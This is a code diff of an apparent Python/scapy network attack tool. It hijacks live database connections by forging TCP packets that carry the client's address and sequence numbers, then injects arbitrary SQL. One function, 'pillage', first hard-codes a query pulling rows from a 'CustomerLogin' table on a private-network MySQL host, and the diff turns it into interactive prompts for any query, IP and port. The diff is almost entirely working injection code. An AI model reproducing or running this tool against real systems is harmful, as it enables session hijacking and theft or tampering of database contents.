@@ -1,5 +1,5 @@
 import sys,threading,time,logging,os,datetime,signal,binascii
-#logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from Queue import Queue
 from sys import path
@@ -191,15 +191,11 @@ class Parse(threading.Thread):
 
         if c:
             for i in self.inject:
-                self.printLn("Checking injection query:\t%s"%i[0])
                 if c.db.ip == i[1] and c.db.port == i[2] and pkt[TCP].sport == i[2] and pkt[TCP].flags == 24: #make sure injecting after db response and it isn't a fragged response
-                    self.printLn("sending query now...")
                     #self.printLn(databaseList[c.db.dbType].encodeQuery(i[0]).encode('hex'))
-                    sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=16,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload)))
+                    #sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=16,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload)))
                     sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=24,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload))/databaseList[c.db.dbType].encodeQuery(i[0]))
-                else:
-                    self.printLn("injection query not targetting this conn")
-                    self.printLn("c.db.ip:\t%s\ni[1]:\t%s\nc.db.port:\t%s\ni[2]:\t%s\npkt[TCP].sport:\t%s\npkt[TCP].flags:\t%s\n"%(c.db.ip,i[1],c.db.port,i[2],pkt[TCP].sport,pkt[TCP].flags))
+                    self.inject.remove(i)
 
         db = self.isKnownDB(pkt)
 
@@ -390,22 +386,20 @@ def printResults():
 
 def pillage():
     global queries
-    #print('[*] Enter query to execute:')
-    #query = raw_input("> ")
-    #print('[*] Enter IP to execute against:')
-    #ip = raw_input("> ")
-    #print('[*] Enter port to execute against:')
-    #port = raw_input("> ")
-    #print('[*] Run "%s" against %s:%s? [y/n]'%(query,ip,port))
-    #ans = raw_input("> ")
-    #if ans == 'y':
-    #    queries.put([query,ip,port])
-    #    print('[*] Query will run as soon as possible')
-    #else:
-    #    print('[*] Cancelling...')
-    #time.sleep(3)
-    queries.put(["select * from CustomerLogin limit 3","192.168.37.133",int("3306")])
-    print("[*] Query will run as soon as possible")
+    print('[*] Enter query to execute:')
+    query = raw_input("> ")
+    print('[*] Enter IP to execute against:')
+    ip = raw_input("> ")
+    print('[*] Enter port to execute against:')
+    port = raw_input("> ")
+    print('[*] Run "%s" against %s:%s? [y/n]'%(query,ip,port))
+    ans = raw_input("> ")
+    if ans == 'y':
+        queries.put([query,ip,port])
+        print('[*] Query will run as soon as possible')
+    else:
+        print('[*] Cancelling...')
+    time.sleep(3)
 
 def parseInput(input,t):
     if input == 'w':
